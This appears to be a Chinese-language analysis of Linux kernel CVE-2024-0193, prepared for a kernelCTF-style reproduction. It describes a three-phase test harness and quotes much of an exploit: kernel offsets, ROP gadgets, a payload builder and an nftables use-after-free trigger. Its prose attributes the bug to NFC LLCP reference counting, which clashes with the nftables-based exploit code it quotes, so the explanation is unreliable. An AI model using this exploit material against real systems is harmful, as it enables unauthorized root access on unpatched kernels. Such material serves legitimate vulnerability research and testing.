...
| CVSS | 7.8 |
| 严重等级 | HIGH |
| 漏洞类型 | Use-After-Free / Reference Count Error |
| 影响内核版本 | v4.20 ~ v6.7 |
| 利用技术 | NFC LLCP nfc_llcp_find_local 引用计数错误导致UAF |

## 原始PoC分析

### 参考来源
- **PoC URL**: https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2024-0193_lts/
- **来源类型**: Google security-research (kernelCTF)

### 利用原理
NFC LLCP协议实现中nfc_llcp_sock_unbind操作未正确处理本地目标的引用计数，导致socket解绑过程中对象被提前释放。攻击者可通过NFC LLCP socket操作触发该漏洞，并发的nfc_llcp_find_local查找访问已释放的local对象构成经典UAF模式。

利用需要NFC设备访问权限（通常为普通用户组），通过精心构造的socket操作序列实现稳定UAF触发。进而通过堆喷射技术覆盖关键内核数据结构，最终实现本地提权。

### 关键技术点
1. NFC LLCP socket unbind时引用计数递减错误
2. nfc_llcp_find_local并发访问已释放对象
3. 堆喷射覆盖释放后的内核对象实现提权
...
### 三阶段验证集成
- **Phase 1 (Prepare)**: 加载NFC相关内核模块(nfc, nfc_llcp)、创建CTF目标文件、记录系统状态快照
- **Phase 2 (Run)**: 降权nobody执行PoC binary，通过NFC LLCP socket操作触发UAF并提权
- **Phase 3 (Post)**: 验证CTF flag写入结果、卸载NFC模块、清理临时文件、恢复系统状态
...
Source: https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2024-0193_lts/exploit/lts-6.1.67/exploit.c
...
uint64_t find_task_by_vpid_off = 0x1b1e20;
uint64_t switch_task_namespaces_off = 0x1b98b0;
uint64_t commit_creds_off = 0x1bb440;
uint64_t init_nsproxy_off = 0x2676640;
uint64_t init_cred_off = 0x2676880;
uint64_t swapgs_restore_regs_and_return_to_usermode_off = 0x1201146;
uint64_t nft_counter_ops_off = 0x1b29060;

// 0xffffffff81f5f869 : push rbx ; and byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; jmp 0xffffffff82404c80
// 0xffffffff810d89ea : pop rdi ; jmp 0xffffffff82404c80
// 0xffffffff8104899f : pop rsi ; jmp 0xffffffff82404c80
// 0xffffffff810ecb31 : mov rdi, rax ; jne 0xffffffff810ecb0d ; xor eax, eax ; jmp 0xffffffff82404c80
// 0xffffffff821699bb : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; jmp 0xffffffff82404c80
// 0xffffffff810369c0 : add rax, rsi ; jmp 0xffffffff82404c80
// 0xffffffff8102785d : pop rcx ; jmp 0xffffffff82404c80
// 0xffffffff81718d7b : mov qword ptr [rax], rcx ; jmp 0xffffffff82404c80
// 0xffffffff81008a04 : pop rsp ; jmp 0xffffffff82404c80

uint64_t push_rbx_pop_rsp = 0xf5f869;
uint64_t pop_rdi_ret = 0x0d89ea;
uint64_t pop_rsi_ret = 0x04899f;
uint64_t mov_rdi_rax_ret = 0x11699bb;
uint64_t add_rax_rsi_ret = 0x0369c0;
uint64_t pop_rcx_ret = 0x02785d;
uint64_t mov_rax_rcx_ret = 0x718d7b;
uint64_t pop_rsp_ret = 0x008a04;
...
void make_payload2(uint64_t* data){
    ...
    // (Bypass rcu protected section because ROP-chain is executed in a RCU read-side critical section)
...
/*
set1 (Vulnerable)
    set1_elem       (set elem for triggering vulnerability, referencing chain3)
set2 (Vulnerable)
    set2_elem       (set elem for triggering vulnerability, referencing chain4)
chain1 (Base)
...
int trig(){
    ...
    if (ret > 0) {
        nft_counter_ops = *(unsigned long*) &read_data[0x170];
    ...
    // wait for destroy work (free Victim chain4)
    usleep(300*1000);
    ...
    nftnl_rule_set_u64(rule_del, NFTNL_RULE_HANDLE, 0x1019);
